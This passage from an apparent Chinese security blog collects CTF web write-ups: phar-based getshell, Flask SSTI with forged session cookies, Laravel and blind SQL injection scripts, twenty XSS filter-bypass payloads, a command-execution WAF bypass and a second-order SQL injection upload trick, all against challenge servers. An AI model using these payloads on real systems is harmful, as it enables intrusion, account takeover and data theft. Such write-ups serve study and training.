requests.post(url_del,cookies=cookies,data=data,timeout=4) except: avatar += chr(j) print(avatar) break可以得到我的账号对应的文件名为1bce72251d3c333，在upload_avatar()中会在文件名后面强行拼接png后缀move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &quot;./img/avatar/&quot; . $name . &quot;.png&quot;);，也就是最终上传的文件名会被命名为1bce72251d3c333.png，如果直接写入shell肯定是无法执行的，不过前面我们读源码的时候利用了require $page .&#39;.php&#39;;，所以我们可以利用phar协议来getshell，在本地写一个shell，然后打包为zip文件，修改文件头并上传 然后上传，之后访问http://111.231.140.29:10080/index.php?action=phar://img/avatar/1bce72251d3c333.png/shell即可getshell 然后就是文件探测了，可以使用find命令snow=system(&#39;find / -name &quot;*flag*&quot;&#39;);，最终payload 1hgame&#123;e4616b38e22d1a22cedc53a90cfaa87f75ccbfe565399857a390950a58a94e68&#125; BabyXss 题目环境有点问题 WEEK-4 happypython python下的ssti，自己当时做的时候想到了要获取secret_key的思路，但是可惜没想到ssti，自己对框架相关问题了解的太少了，以后要在这方面加强一下，简单测试一下可以发现该框架是存在模板注入的问题的http://118.25.18.223:3001/{{1+1}} 接下来读取配置文件http://118.25.18.223:3001/{{config}}，可以获取到secret_key 解一下cookie 1python session.py decode -c .eJwlj0FqQzEMBe_idRaSLMl2LvORZYmGQAv_J6vSu8fQ1ayGee-3HHnG9VXur_Mdt3I8VrkXEETAdKvkc1EbK5fG0D4oXKR3DND0qSbUGy1gHwTeONI8RxCLVOWuWmU2iC27qzNrwuSKCpDTbCipEfQxyY3Fos2-nGKWW_HrzOP184zvvUexCUtm3wzlXRAbKQwzrCOtMJJel2zvfcX5fwIRy98HJ4Y_iA.XHUmGA.wO2v6jNOPBHknlA5tAqik2bE_hI -s 9RxdzNwq7!nOoK3* 1&#123;u&#39;csrf_token&#39;: u&#39;617545ff8175e64f9e5a9f540bea812dea2583d5&#39;, u&#39;_fresh&#39;: True, u&#39;user_id&#39;: u&#39;111&#39;, u&#39;_id&#39;: u&#39;051101fca32cbd279dfd6e96892ec55881e06fcb6a52872d04c920c74efacf9e245536486635b70ed6ecc6c446f0b431600fbaa9626a2089b2ca45ae7b8dc2eb&#39;&#125; 猜测user_id可能代表的是用户id，猜测admin的用户ID为1，修改一下id为1伪造cookie 1python session_cookie_manager.py encode -s 9RxdzNwq7!nOoK3* -t &#123;&#39;csrf_token&#39;:&#39;617545ff8175e64f9e5a9f540bea812dea2583d5&#39;,&#39;_fresh&#39;:True,&#39;user_id&#39;:&#39;1&#39;,&#39;_id&#39;:&#39;0 51101fca32cbd279dfd6e96892ec55881e06fcb6a52872d04c920c74efacf9e245536486635b70ed6ecc6c446f0b431600fbaa9626a208 9b2ca45ae7b8dc2eb&#39;&#125; 然后将生成的cookie覆盖原来cookie即可得到flag 1hgame&#123;Qu_bu_la1_m1ng_z1_14&#125; ps: 这题我入了一个坑点，在伪造cookie的时候，命令行下老是报错ValueError: dictionary update sequence element #0 has length 1; 2 is required，查看了一下代码发现是在dict()函数处报错的 1session_cookie_structure = dict(ast.literal_eval(session_cookie_structure)) 但是同样的代码在linux下就可以正常运行，测试了一下发现在windows下dict的参数其实是类似于{aa:aa}，而linux下却是{&#39;aa&#39;:&#39;aa&#39;}，命令行输入是完全相同的，显然windows下的参数无法正确执行，经过研究发现是&quot;捣的鬼，在windows下我们输入的&quot;是不会被捕获的，只会捕获双引号里面的内容，而单引号不存在这个问题，如果想要输入双引号必须要反斜杠转义，举个例子 123import sysfor i in range(4): print(sys.argv[i]) 我们输入python b.py &quot;key&quot;:&quot;value&quot; &#39;key&#39;:&#39;value&#39; \\&quot;\\&#39;，此时输出为1234b.pykey:value&#39;key&#39;:&#39;value&#39;&quot;\\&#39; 这就是区别，应该是windows特性的问题，自己被坑了好久还以为自己做的不对（泪奔~~~~~） happyPHP 正常注册之后登录，查看源代码可以得到项目源代码!--https://github.com/Lou00/laravel--&gt; 审计代码时，一般应该从路由开始看起，看一共有哪些页面，实现了哪些功能，对于laraval来说，我们先从routes/web.php开始审计 可以看到实现的路由，例如对第一行来说，表示的意思就是将根目录发送给StaticPagesController控制器下的home方法进行解析，name方法用来命令路由，便于后期的维护。 app中的文件是框架的核心控制部分，我们查看一下该部分看看，在SessionController.php中发现了问题 123456789if (Auth::attempt($credentials)) &#123; if (Auth::user()-&gt;id ===1)&#123; session()-&gt;flash('info','flag :******'); return redirect()-&gt;route('users.show'); &#125; $name = DB::select(\"SELECT name FROM `users` WHERE `name`='\".Auth::user()-&gt;name.\"'\"); session()-&gt;flash('info', 'hello '.$name[0]-&gt;name); return redirect()-&gt;route('users.show');&#125; 可以看到此处存在sql语句，在laraval中有更加安全的sql查询方式，这儿显然存在问题的，存在sql注入问题，我们可以注册一个用户名为&#39; union select group_concat(email,password) from users where id=1#，然后登录即可获得该用户的email和密码（因为题目要求id=1的用户登录才可以得到flag）， 1admin@hgame.comeyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ&#x3D;&#x3D; 密码是经过加密的，解密一下 {“iv”:”rnVrqfCvfJgnvSTi9z7KLw==”,”value”:”EaR/4fldOGP1G/aDK8e8u1Aldmxl+yB3s+kBAaoPods=”,”mac”:”56e2b33ecd2828fe6f417c7e98e9a588c097f083499e0cc7237bc27741e829af”} 查看配置文件可以发现使用了aes加密，但是key值不知道12&#39;key&#39; &#x3D;&gt; env(&#39;APP_KEY&#39;),&#39;cipher&#39; &#x3D;&gt; &#39;AES-256-CBC&#39;, 回滚git版本找到key值 APP_KEY=base64:9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ= 接下来编写解密脚本123456789101112import base64from Crypto.Cipher import AESiv = 'rnVrqfCvfJgnvSTi9z7KLw=='value = 'EaR\\/4fldOGP1G\\/aDK8e8u1Aldmxl+yB3s+kBAaoPods='enc = '9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ='enc = base64.b64decode(enc)iv = base64.b64decode(iv)value = base64.b64decode(value)cryptor = AES.new(enc,AES.MODE_CBC,iv)con = cryptor.decrypt(value)print con 可以得到密码为9pqfPIer0Ir9UUfR，登录即可得到flag Reference： https://xz.aliyun.com/t/3161 https://zry.io/archives/183","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"XSS20冲关之旅","slug":"xss20","date":"2019-03-01T16:09:49.000Z","updated":"2019-05-20T12:32:32.015Z","comments":true,"path":"2019/03/02/xss20/","link":"","permalink":"http://chaosec.top/2019/03/02/xss20/","excerpt":"前言 最近学到了xss漏洞，来做一下这个xss题目","text":"前言 最近学到了xss漏洞，来做一下这个xss题目 XSS-1 第一关热身，没有任何过滤。payload：&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; XSS-2 查看代码可知1234$str = $_GET[\"keyword\"];echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword value=\"'.$str.'\"&gt; 对于输入的内容，题目使用了htmlspecialchars来转义特殊字符，此处不好绕过，但是题目在input标签中却没有验证参数而直接输入，此时我们可以构造payload闭合input标签 payload: keyword=&quot;&gt; &lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;，此时在代码中input标签的内容就变成1&lt;input name&#x3D;keyword value&#x3D;&quot;&quot;&gt; &lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt; 成功成为了两个标签从而xss成功 XSS-3 这此input标签也被转义了，所以只能正面绕过htmlspecialchar()函数了，百度可以发现该函数默认是不转义单引号的，只有设置了quotestyle 选项为ENT_QUOTES才会过滤单引号，而本题又是单引号闭合的所以用单引号即可绕过 payload: http://localhost/xss20/level3.php?keyword=&#39; onclick=&#39;window.alert()&#39; XSS-4 我们可以先fuzz一下，输入&lt;script&gt;&#39;&quot;，然后查看源代码可知 可以看到题目将左右尖括号置换为空，但是单双引号都还可以用，本题是用双引号闭合的，所以只需要把第三关的稍微改一下即可 1http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level4.php?keyword&#x3D;&quot; onclick&#x3D;&quot;window.alert()&quot; XSS-5 想上一关测试一下&lt;script&gt;&#39;&quot;，发现scirpt被转成了scr_ipt，我们可以尝试上关的payload闭合双引号，但是发现onclick被置换成了o_nclick，换个思路，第二题中由于题目没有过滤&lt;&gt;，我们可以另行构造一个标签，在本题中也没有单独过滤这两个符号，所以可以用类似第二关的方式绕过1http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level5.php?keyword&#x3D;&quot;&gt;&lt;a href&#x3D;javascript:alert(19)&gt; 查看源代码可知题目采用黑名单过滤了&lt;script和on两个敏感词 XSS-6 测试&lt;script&gt;&#39;&quot;on，发现还是基本和上关的过滤一样，&lt;input name=keyword value=&quot;&lt;scr_ipt&gt;&#39;&quot;o_n&quot;&gt;，用上题payload故技重施，发现并没有那么简单，href被置换成了hr_ef，继续测试data,action,formaction，继续测试可以发现很多都被过滤了，走投无路之下大小写绕过试了一下居然就过了，可我记得上道题是大小写不敏感的呀…1http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level6.php?keyword&#x3D;&quot;&gt;&lt;a Href&#x3D;javascript:alert(19)&gt; XSS-7 继续测试&lt;script&gt;&#39;&quot;on-&gt;&lt;&gt;&#39;&quot;on，猜测可能是将script置换为空字符，尝试双写绕过&lt;scscriptript&gt;，成功！对于其他敏感词如on等也可以用双写绕过，之前都是将敏感字符加下划线，本题是转化为空字符串1http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level7.php?keyword&#x3D;&quot; oonnclick&#x3D;&quot;window.alert() XSS-8 测试script&gt;&lt;&#39;&quot; 可以看到对于a标签来说只过滤了双引号，还有将script替换成了scr_ipt，由于过滤了双引号，所以我们之前的闭合双引号构造其它标签的方法就不行了，只能在href=&quot;&quot;上面做文章，本来我们可以提交javascript:alert()，但是题目污染了script敏感词，不过我们可以使用html实体编码绕过（即&amp;#开头的编码方式）1http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level8.php?keyword&#x3D;java&amp;#115;cript:alert(&#39;xss&#39;) 1234567$str = strtolower($_GET[\"keyword\"]);$str2=str_replace(\"script\",\"scr_ipt\",$str);$str3=str_replace(\"on\",\"o_n\",$str2);$str4=str_replace(\"src\",\"sr_c\",$str3);$str5=str_replace(\"data\",\"da_ta\",$str4);$str6=str_replace(\"href\",\"hr_ef\",$str5);$str7=str_replace('\"','&amp;quot',$str6); 查看后台代码可知题目果然就是直接将敏感词转换，所以确实存在编码绕过的问题的 浏览器解码方式与XSS 在上一关中，我们利用html实体编码实现了弹窗， 想要探究这些问题的原理，我们就必须去了解一下浏览器究竟是怎么解码的 浏览器在解析时，首先由浏览器解析HTML生成DOM树，然后解析CSS生成CSSDOM树，之后JS解释器才开始进行解析执行， 如果碰到URL的话会由URL解释器进行解码，为了我们研究问题，我们可以粗略的把浏览器分为三部分HTML解释器，URL解释器，JS解释器，顺序简化为HTML-&gt;URL-&gt;JS各种解释器能够识别的编码方式 HTML解释器识别的是HTML实体编码，也就是&amp;#xx这种的 URL解释器可以识别URL编码 JS解释器可以识别Unicode编码，类似\\uxxx 浏览器最早开始解析HTML，将标签转化为内容树中的DOM 节点，此时识别标签的时候，HTML 解析器是无法识别那些被实体编码的内容的，只有建立起DOM 树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码。在此基础上，JavaScript DOM API 参与进来，可以对DOM 树进行修改，改变DOM树的结构和内容。这段话说的比较清楚了，在dom树构建之时，html实体编码是没有被自解码的，那么此时dom树的节点结构就已经被固定了。后续自解码以后并不会影响到dom树/节点/标签的结构。这个道理和sql中的预编译是有些类似的。之后的自解码以后获得的&lt;&gt;将不会被解析成新的节点。 但并不是说dom树构建完毕后就不能被改变了。js是可以操作节点进行增删改操作的。 我们来探讨一下下面四个写法是否能够成功执行JS &lt;a href=javascript:al\\u65rt(1)&gt;click&lt;/a&gt; &lt;a href=javascript:al%65rt(1)&gt;click&lt;/a&gt; &lt;a href=javascript:al&amp;#101;rt(1)&gt;click&lt;/a&gt; &lt;a href=jav%61script:alert(1)&gt;click4&lt;/a&gt; 第一种写法无法实现弹窗，因为HTML和url都无法识别unicode编码，只有JS可以解码，但是在JS解释之前alert的e是被编码的状态，JS不会认为该语句是可以执行的，因为有一个被编码的字符e，如果此时修改为alert(&#39;\\u65&#39;)就可以被成功执行 第二种写法可以实现弹窗，因为url解码是在js解码之前的，所以在JS执行之前已经得到完整的JS代码了，所以可以执行 第三种写法自然也可以实现弹窗，因为HMLT解码更早，在url解码之前，所以自然能够执行 第四种写法无法执行，因为在url识别阶段，解码得到的javascript，此时自然不会将JavaScript看做是伪协议，所以跳转链接会产生错误，可以与第二种写法进行比对 回到第8题，我们也就可以理解了，如果我们将javacript全部进行html实体编码，显然也是可以执行成功的，但是进行url编码则无法成功，与上面第4个例子的原理是一样的 XSS-9 测试可知依然存在上述的编码绕过问题，但是本题加入了一个链接检测，如果链接不合法就会被拦截，经过测试发现只要链接中出现http://就会被判定为合法链接，之后我们再用注释将这段字符注释掉即可 1http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level9.php?keyword&#x3D;java&amp;#115cript:alert()&#x2F;*http:&#x2F;&#x2F;*&#x2F; 查看代码可以看到过滤果然就是我们猜测的内容1if(false===strpos($str7,'http://')) XSS-10 本题主要考察隐藏元素的寻找，因为本题不在是前面题目用keyword的内容来替代，查看源代码可知有一个新表单存在三个参数，因为类型是hidden所以看不到，测试发现第三个参数是有效参数，而且只过滤了&lt;&gt;两个符号，所以我们用之前的payload即可，在设置type=text使其可见 1http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level10.php?keyword&#x3D;aaa&amp;t_link&#x3D;addd&amp;t_history&#x3D;ffads&amp;t_sort&#x3D;&quot; onclick&#x3D;&quot;window.alert()&quot; type&#x3D;&quot;text XSS-11 题目中的t_sort字段过滤比较严格，无法绕过，但是题目在访问的时候消息头中会存在Referer字段，该字段存在注入的问题 测试&lt;&gt;script&#39;&quot;，发现&lt;&gt;被过滤了，其余正常，所以payload就很简单了，和前面一样，只是位置变了而已 XSS-12 和上体基本一样，只不过本题是UA头的xss 1&quot; onclick&#x3D;&quot;window.alert()&quot; type&#x3D;&quot;text XSS-13 cookie的xss 1user&#x3D;&quot; onclick&#x3D;&quot;window.alert()&quot; type&#x3D;&quot;text; XSS-14 这关环境有问题，网站访问不了，好像是一个图片型xss XSS-15 ng-include 题目好像有点问题 XSS-16 本题过滤的挺多的，过滤了script、空格、/，只要没过滤尖括号就万事好说，空格我们可以用%0a绕过，payload12http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level16.php?keyword&#x3D;&lt;input%0Aonclick&#x3D;&quot;window.alert()&quot;&gt;http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level16.php?keyword&#x3D;&lt;image%0Asrc&#x3D;1%0aonerror&#x3D;&quot;alert()&quot;&gt; XSS-17 本题有两个参数arg01和arg02，虽然还有flash，但是这道题和flash没关系，别被迷惑，测试一下输出点在哪个参数，发现arg02上有输出，&lt;&gt;、&quot;被过滤，我们可以使用onclick参数 1http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level17.php?arg01&#x3D;ffff&amp;arg02&#x3D;fff%208888%20onclick&#x3D;alert() XSS-18 过滤了&lt;&gt; &quot;，感觉和17题没什么区别 12http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level18.php?arg01&#x3D;wwww&amp;arg02&#x3D;bfff%20888%20onfocus&#x3D;alert()http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level18.php?arg01&#x3D;wwww&amp;arg02&#x3D;bfff%20888%20onclick&#x3D;alert() 可能我太菜了，没get到17、18两题的考点，希望看到的师傅们和我交流一下XD XSS-19 从这关开始之后就是flash xss了，看了代码也看不懂2333，测试了一下这个payload是可以用的， 1http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level19.php?arg01&#x3D;version&amp;arg02&#x3D;%3Ca%20href&#x3D;%22javascript:alert(document.domain)%22%3Exss_by_SST%3C&#x2F;a%3E XSS-20 payload看不懂 1http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level20.php?arg01&#x3D;id&amp;arg02&#x3D;\\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a&#x3D;!alert(document.cookie)&#x2F;&#x2F;%26width%26height 有时间再研究吧，这个用的另一种脚本语言 总结 对于XSS的绕过，可以采用双写，大小写，闭合标签，利用过滤不完全的漏洞来使用标签 XSS一般利用js脚本读取用户浏览器中的Cookie，而如果在服务器端对Cookie 设置了HttpOnly 属性，那么js脚本就不能读取到cookie，但是浏览器还是能够正常使用cookie 总的来说，对于XSS攻击，我们要对输入参数进行过滤，对输出进行编码转义，白名单和黑名单相结合。 reference:https://www.cnblogs.com/escape-w/p/10162831.htmlhttps://blog.csdn.net/he_and/article/details/80588409","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"http://chaosec.top/tags/XSS/"}]},{"title":"CUMTCTF第二轮月赛","slug":"cumtctf2","date":"2019-01-30T14:50:00.000Z","updated":"2019-02-12T14:29:27.946Z","comments":true,"path":"2019/01/30/cumtctf2/","link":"","permalink":"http://chaosec.top/2019/01/30/cumtctf2/","excerpt":"前言 本次题目比较简单，有幸ak了web，可惜还是没进前三，二进制和pwn做的太差了，区块链也没做出来，要是做出来就前三了，有时间还是要学习一下区块链。","text":"前言 本次题目比较简单，有幸ak了web，可惜还是没进前三，二进制和pwn做的太差了，区块链也没做出来，要是做出来就前三了，有时间还是要学习一下区块链。 web 签到题 123456789101112131415161718192021222324252627282930&lt;?php $white_list = range(0,9); require_once('flag.php'); if(isset($_REQUEST['0ver']) &amp;&amp; isset($_REQUEST['0ver1']) &amp;&amp; isset($_REQUEST['0ver2']))&#123; $a = $_REQUEST['0ver']; $b = $_REQUEST['0ver1']; $c = $_REQUEST['0ver2']; if(@ereg(\"^[0-9]+$\", $a) === FALSE)&#123; echo 'no must be number'; &#125;else&#123; if(in_array($a,$white_list))&#123; if(strlen($a)&gt;1)&#123; if(md5($c) === md5($b) &amp;&amp; ($b !== $c))&#123; echo \"&lt;img src='dark.png'&gt;&lt;br&gt;\"; echo 'you are a great dark phper&lt;br&gt;'; echo $flag; &#125; else&#123; echo \"you can do it!!!\"; &#125; &#125;else&#123; echo 'you no dark'; &#125; &#125;else&#123; echo 'you are so dark'; &#125; &#125; &#125;else highlight_file(__FILE__); 很简单的代码审计题目，第一次绕过要求0ver是数字0-9以内的整数，但是长度却要大于1位，使用 03类似的即可绕过，也可以使用%00截断，第二层要求两个相同md5值的文件（不是弱类型比较），这样的文件也是有的，记得强网杯好像就有类似的题目，参考一下即可 paylaod： 1curl -v http:&#x2F;&#x2F;202.119.201.199:32790?0ver&#x3D;02 --data &quot;0ver1&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;0ver2&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&quot; 1flag:flag&#123;73100259ca8919f402846b00d3b939a9&#125; SimpleUpload 查看源码可知发现前端验证设置了白名单，只允许上传.jpg|.png|.gif。 这里需要绕过前端验证，上传1.jpg，利用burp截断修改后缀名为1.php。 小型线上赌场 题目提示了断电，应该是vi文件泄露，测试发现 .index.swp存在泄露，vim恢复一下 1vi -r index.swp 代码如下 123456789101112131415&lt;?php $invest = $_GET['invest']; $rand = rand(2,50); $len = strlen(trim($_GET['invest'])); foreach ($_GET as $key =&gt; $value) &#123; if(!is_numeric($value)||$value == '0')&#123; die('no no no!'); &#125; &#125; $money = number_format($invest*$rand); $money = intval(str_replace(',','',$money)); $guess = intval($_GET['guess']); if ($guess == $money &amp;&amp; strlen($money)===$len) &#123; echo $flag;&#125; 代码思路是提交invest值，然后乘以一个2-50之间的随机数与我们猜测的相等即可得到flag，直接多次尝试爆破即可，即每次都提交invest值为2，guess值为6，只要某次随机数为3的时候即可得到flag 1flag&#123;7e1e2bfe75c980be35c61ed1bde7a6f2&#125; SimpleSQLi 1python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 --dbs 数据库名为security 1python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 -D security --tables 表名flagishere 1python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 -D security -T flagishere --columns --threads&#x3D;10 列名id,flag 1python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 -D security -T flagishere -C &quot;id,flag&quot; --dump --threads&#x3D;10 1flag&#123;4ur0Ra_SimPlE_sQLi_23333&#125; 真的简单。。 随手fuzz一下 1http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;1%27 报错 1http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;1%27--+ 可以正常返回，猜测是单引号注入 1http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-1%27%20or%201&#x3D;1--+ 无正确回显，猜测可能是or有问题，换 || 试一下 1http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;length(database())--+ 果然返回正确，数据库长度为3 题目过滤了or，但是可以绕过 1http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-1%27%20oorr%201&#x3D;1--+ 爆列数 1http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;3 oorrder by 3--+ 共有三列 1http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,database(),3--+ database:ctf 接下来就是常规的注入了 1http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema&#x3D;database()--+ table：ctf,flag 1http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_schema&#x3D;database()--+ 列名：id,flag 1http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,flag,3 from flag--+ 居然还有题目.. flag in admin_08163314/exec.php 访问一下，是个命令执行界面，过滤了空格，可用$IFS绕过，尝试列根目录但是失败了，猜测可能是/被过滤了，但是 * .没有被过滤，可以用来读文件exec.php 可以得到源码 1234567891011&lt;?phpfunction waf_exec($str)&#123; $black_str = \"/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\\?|@|\\+|\\/| )/i\"; $str = preg_replace($black_str, \"\",$str); return $str;&#125;if (@$_POST['cmd']) &#123; $cmd = waf_exec($_POST['cmd']); system($cmd);&#125; 知道了过滤规则就好办了，接下里可以用base64编码绕过，列根目录 注意这里的flag_3314是个目录，还得继续列目录 1flag&#123;3570d4d9c72a19c889140674827eeca5&#125; SimpleSQLi2 fuzz测试了一下感觉是数字型注入 1http:&#x2F;&#x2F;bxs.cumt.edu.cn:30010&#x2F;test&#x2F;index.php?id&#x3D;-1%20||%201&#x3D;1 接下来测试过滤规则 1http:&#x2F;&#x2F;bxs.cumt.edu.cn:30010&#x2F;test&#x2F;index.php?id&#x3D;2&gt;2 || length(&#39;seleselectct&#39;)&#x3D;6 测试发现过滤了 select,or,空格，空格可用/**/绕过，select等可双写绕过，接下来只需要编写盲注脚本即可 123456789101112131415161718192021import requestswords = \"2019~\"url = \"http://bxs.cumt.edu.cn:30010/test/index.php?id=\"table = \"\"# payload = \"2&gt;2/**/||/**/ascii(substr((seselectlect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))=&#123;&#125;\"# emails,flagishere,referers,uagents,users# payload = \"2&gt;2/**/||/**/ascii(substr((seselectlect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='flagishere'),&#123;&#125;,1))=&#123;&#125;\"# Id,flagpayload = \"2&gt;2/**/||/**/ascii(substr((seselectlect/**/flag/**/from/**/flagishere),&#123;&#125;,1))=&#123;&#125;\"for j in range(1,60): for i in range(34,128): res = requests.get(url+payload.format(j,i)).text if words in res: table += chr(i) print(table) break 可以得到flag如下 1flag&#123;4nother_SimPLE_SQLi_0rek1&#125; 后来和出题人交流了一下，思路非预期2333~ 文件管理系统 网站有主要功能是上传文件和修改、删除文件，过滤了php等相关的文件名，无法绕过，原本的我的思路是上传一个xxxx.jpg，然后修改文件名，通过修改文件名为 xxxx.php%00.jpg 或者其它方法截断后面的jpg后缀，结果尝试了各种姿势都未果，无可奈何之下扫了一波目录，结果柳暗花明，得到了源码www.zip 核心代码如下 upload.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475require_once \"common.inc.php\";define('ROOT',dirname(__FILE__).'/'); if($_FILES)&#123; $file = $_FILES[\"upfile\"]; if($file[\"error\"] == UPLOAD_ERR_OK) &#123; $name = basename($file[\"name\"]); $path_parts = pathinfo($name); if(!in_array($path_parts[\"extension\"], array(\"gif\", \"jpg\", \"png\", \"zip\", \"txt\"))) &#123; exit(\"error extension\"); &#125; $path_parts[\"extension\"] = \".\" . $path_parts[\"extension\"]; $name = $path_parts[\"filename\"] . $path_parts[\"extension\"]; $path_parts['filename'] = addslashes($path_parts['filename']); $sql = \"select * from `file` where `filename`='&#123;$path_parts['filename']&#125;' and `extension`='&#123;$path_parts['extension']&#125;'\"; $fetch = $db-&gt;query($sql); if($fetch-&gt;num_rows&gt;0) &#123; exit(\"file is exists\"); &#125; //echo $file[\"tmp_name\"], ROOT . UPLOAD_DIR . $name; if(move_uploaded_file($file[\"tmp_name\"], ROOT . UPLOAD_DIR . $name)) &#123; $sql = \"insert into `file` ( `filename`, `view`, `extension`) values( '&#123;$path_parts['filename']&#125;', 0, '&#123;$path_parts['extension']&#125;')\"; $re = $db-&gt;query($sql); if(!$re) &#123; echo 'error'; print_r($db-&gt;error); exit; &#125; $url = \"/\" . UPLOAD_DIR . $name; echo \"Your file is upload, url: &lt;a href=\\\"&#123;$url&#125;\\\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt; &lt;a href=\\\"/\\\"&gt;go back&lt;/a&gt;\"; &#125; else &#123; exit(\"upload error\"); &#125; &#125; else &#123; print_r(error_get_last()); exit; &#125;&#125;``` rename.php```phprequire_once \"common.inc.php\";define('ROOT',dirname(__FILE__).'/'); if(isset($req['oldname']) &amp;&amp; isset($req['newname'])) &#123; $result = $db-&gt;query(\"select * from `file` where `filename`='&#123;$req['oldname']&#125;'\"); if ($result-&gt;num_rows&gt;0) &#123; $result = $result-&gt;fetch_assoc(); &#125;else&#123; exit(\"old file doesn't exists!\"); &#125; if($result) &#123; $req['newname'] = basename($req['newname']); $re = $db-&gt;query(\"update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;\"); if(!$re) &#123; print_r($db-&gt;errorInfo()); exit; &#125; $oldname = ROOT.UPLOAD_DIR . $result[\"filename\"].$result[\"extension\"]; $newname = ROOT.UPLOAD_DIR . $req[\"newname\"].$result[\"extension\"]; if(file_exists($oldname)) &#123; rename($oldname, $newname); $url = \"/\" . $newname; echo \"Your file is rename, url: &lt;a href=\\\"&#123;$url&#125;\\\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt; &lt;a href=\\\"/\\\"&gt;go back&lt;/a&gt;\"; &#125; else&#123;echo $oldname.\" not exists.\";&#125; &#125;&#125;?&gt; 由代码可以看出，题目是通过数据库来拼凑最终的文件名，审计了下代码没发现什么有用的思路，google了一下居然找到了原题！！2233 http://drops.xmd5.com/static/drops/tips-10564.html，而且还给出了攻击流程，本题是个二次注入。 题目使用了白名单过滤，所以所以无法通过后缀名绕过，而题目，漏洞发生在rename.php页面中，实现重命名功能时，在数据库中以文件名来查询，获取文件扩展名，id等信息，然后我们输入的新的文件名和查询的文件扩展名拼接在一起完成重命名，如果我们能够使查询的文件扩展名为空，那么拼接之后就只剩下我们的文件名了，通过这种方法可以实现修改文件名后缀的目的，攻击流程如下 选择一个文件上传，命名为 &#39;,extension=&#39;&#39;,filename=&#39;snow.jpg.jpg，此时执行的sql语句是insert into file ( filename, view, extension) 